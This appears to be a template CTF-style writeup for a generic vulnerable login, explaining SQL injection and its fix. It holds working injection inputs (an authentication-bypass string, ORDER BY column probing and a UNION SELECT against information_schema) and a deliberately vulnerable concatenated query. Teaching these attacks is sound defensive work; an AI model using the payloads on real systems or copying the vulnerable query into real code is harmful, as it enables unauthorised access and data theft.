---
title: "Sample THM Writeup: A Login Form and Union-Based SQL Injection"
date: "2026-10-05"
description: "A template for a TryHackMe room writeup, walking through authentication bypass and UNION-based SQL injection against a deliberately vulnerable login."
category: "writeup"
platform: "THM"
difficulty: "Easy"
tags:
  - web
  - sql-injection
  - sample
published: true
---

> [!NOTE]
> **Sample content.** This is an illustrative walkthrough of a generic vulnerable login, not a record of a specific room. Replace it with your own notes.

## Task overview

The target is a login form backed by a SQL database. The goals are to bypass authentication and then extract data from another table.

## Authentication bypass

The server builds its query by concatenating user input:

```python
query = f"SELECT * FROM users WHERE username = '{user}' AND password = '{pw}'"
```

Submitting `admin' --` as the username comments out the password check:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
```

## UNION-based extraction

First find the number of columns with `ORDER BY`, increasing until the page errors:

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   <- error: 2 columns
```

Then identify which columns are reflected and read from `information_schema`:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()-- -
```

## The fix

Use parameterised queries so input is never parsed as SQL:

```python
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password_hash = %s",
    (user, hash_password(pw)),
)
```

> [!IMPORTANT]
> Escaping quotes by hand is not a fix. Parameterised queries are.
